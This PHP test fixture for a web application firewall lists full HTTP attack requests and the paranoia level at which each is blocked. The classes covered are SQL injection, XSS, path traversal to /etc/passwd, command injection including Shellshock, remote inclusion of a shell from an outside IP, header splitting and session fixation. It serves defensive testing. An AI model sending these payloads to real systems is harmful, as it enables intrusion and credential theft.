<?php

declare(strict_types=1);

/**
 * Curated, realistic full HTTP attacks grouped by attack class.
 *
 * Unlike tests/Fixtures/rule-payloads.php (one rule id fired in isolation), each
 * entry here is a complete request that trips several shipped rules whose
 * accumulated CRS anomaly score crosses the block threshold. Every URI carries a
 * percent-encoded query string so it round-trips through PSR-7 URI parsing to the
 * intended parameter value.
 *
 * `minBlockedParanoiaLevel` is the lowest paranoia level at which the shipped
 * rules block the request at CoreRuleSet::DEFAULT_ANOMALY_THRESHOLD; the values
 * were verified against the imported CRS release. Paths use neutral probes
 * (/.env, /.git) rather than product-specific admin routes.
 *
 * @return list<array{
 *     label: string,
 *     attackClass: string,
 *     method: string,
 *     uri: string,
 *     headers: array<string, string>,
 *     cookies: array<string, string>,
 *     body: array<string, string>|null,
 *     minBlockedParanoiaLevel: int,
 * }>
 */

$browserUserAgent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
$accept = [
    'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language' => 'en-US,en;q=0.9',
];
$browserHeaders = ['User-Agent' => $browserUserAgent] + $accept;

return [
    // --- SQL injection ---------------------------------------------------
    [
        'label' => 'sqli-union-select',
        'attackClass' => 'sql-injection',
        'method' => 'GET',
        'uri' => 'https://shop.example/products?id=1%27%20UNION%20SELECT%20username%2C%20password%20FROM%20users--%20-',
        'headers' => $browserHeaders,
        'cookies' => ['sessionid' => 'a1b2c3d4e5f6'],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'sqli-login-bypass',
        'attackClass' => 'sql-injection',
        'method' => 'POST',
        'uri' => 'https://shop.example/login',
        'headers' => ['Content-Type' => 'application/x-www-form-urlencoded'] + $browserHeaders,
        'cookies' => [],
        'body' => ['username' => "admin' OR '1'='1'-- -", 'password' => 'x'],
        'minBlockedParanoiaLevel' => 2,
    ],
    [
        'label' => 'sqli-time-based',
        'attackClass' => 'sql-injection',
        'method' => 'GET',
        'uri' => 'https://shop.example/article?id=1%20AND%20SLEEP%285%29--%20-',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- Cross-site scripting -------------------------------------------
    [
        'label' => 'xss-script-tag',
        'attackClass' => 'xss',
        'method' => 'GET',
        'uri' => 'https://blog.example/search?q=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'xss-img-onerror',
        'attackClass' => 'xss',
        'method' => 'GET',
        'uri' => 'https://blog.example/comments?text=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- LFI / path traversal -------------------------------------------
    [
        'label' => 'lfi-etc-passwd',
        'attackClass' => 'lfi-path-traversal',
        'method' => 'GET',
        'uri' => 'https://app.example/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'lfi-encoded-traversal',
        'attackClass' => 'lfi-path-traversal',
        'method' => 'GET',
        'uri' => 'https://app.example/view?tpl=..%252f..%252f..%252f..%252fetc%252fpasswd',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- OS command injection (RCE) -------------------------------------
    [
        'label' => 'rce-command-substitution',
        'attackClass' => 'rce-os-command',
        'method' => 'GET',
        'uri' => 'https://app.example/ping?host=%24%28cat%20%2Fetc%2Fpasswd%29',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'rce-shellshock-ua',
        'attackClass' => 'rce-os-command',
        'method' => 'GET',
        'uri' => 'https://app.example/cgi-bin/status',
        'headers' => ['User-Agent' => '() { :; }; /bin/cat /etc/passwd'] + $accept,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'rce-pipe-command',
        'attackClass' => 'rce-os-command',
        'method' => 'GET',
        'uri' => 'https://app.example/net?ip=127.0.0.1%7Cid',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 3,
    ],

    // --- Remote / PHP file inclusion ------------------------------------
    [
        'label' => 'rfi-remote-url',
        'attackClass' => 'rfi',
        'method' => 'GET',
        'uri' => 'https://app.example/index.php?page=http%3A%2F%2F198.51.100.9%2Fshell.txt%3F',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'php-wrapper-filter',
        'attackClass' => 'rfi',
        'method' => 'GET',
        'uri' => 'https://app.example/index.php?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- Scanner / bad-bot User-Agent -----------------------------------
    [
        'label' => 'scanner-sqlmap',
        'attackClass' => 'scanner-bad-bot',
        'method' => 'GET',
        'uri' => 'https://app.example/.env',
        'headers' => ['User-Agent' => 'sqlmap/1.7.2#stable (https://sqlmap.org)'] + $accept,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'scanner-nikto',
        'attackClass' => 'scanner-bad-bot',
        'method' => 'GET',
        'uri' => 'https://app.example/.git/config',
        'headers' => ['User-Agent' => 'Mozilla/5.00 (Nikto/2.1.6)'] + $accept,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- HTTP protocol violation ----------------------------------------
    [
        'label' => 'proto-malformed-headers',
        'attackClass' => 'http-protocol-violation',
        'method' => 'GET',
        'uri' => 'http://203.0.113.10/index.php',
        'headers' => ['Host' => '203.0.113.10', 'Connection' => 'keep-alive, close'] + $accept,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'proto-response-splitting',
        'attackClass' => 'http-protocol-violation',
        'method' => 'GET',
        'uri' => 'https://app.example/redirect?url=https%3A%2F%2Fapp.example%2F%0D%0ASet-Cookie%3A%20sessionid%3Dattacker',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],

    // --- Session fixation ------------------------------------------------
    [
        'label' => 'sessfix-cookie-domain',
        'attackClass' => 'session-fixation',
        'method' => 'GET',
        'uri' => 'https://app.example/redir?r=document.cookie%3D%27sid%3Dabc%3Bdomain%3D.evil.example%27',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
    [
        'label' => 'sessfix-http-equiv',
        'attackClass' => 'session-fixation',
        'method' => 'GET',
        'uri' => 'https://app.example/redir?r=%3Cmeta%20http-equiv%3D%22set-cookie%22%20content%3D%22sid%3Dabc%22%3E',
        'headers' => $browserHeaders,
        'cookies' => [],
        'body' => null,
        'minBlockedParanoiaLevel' => 1,
    ],
];
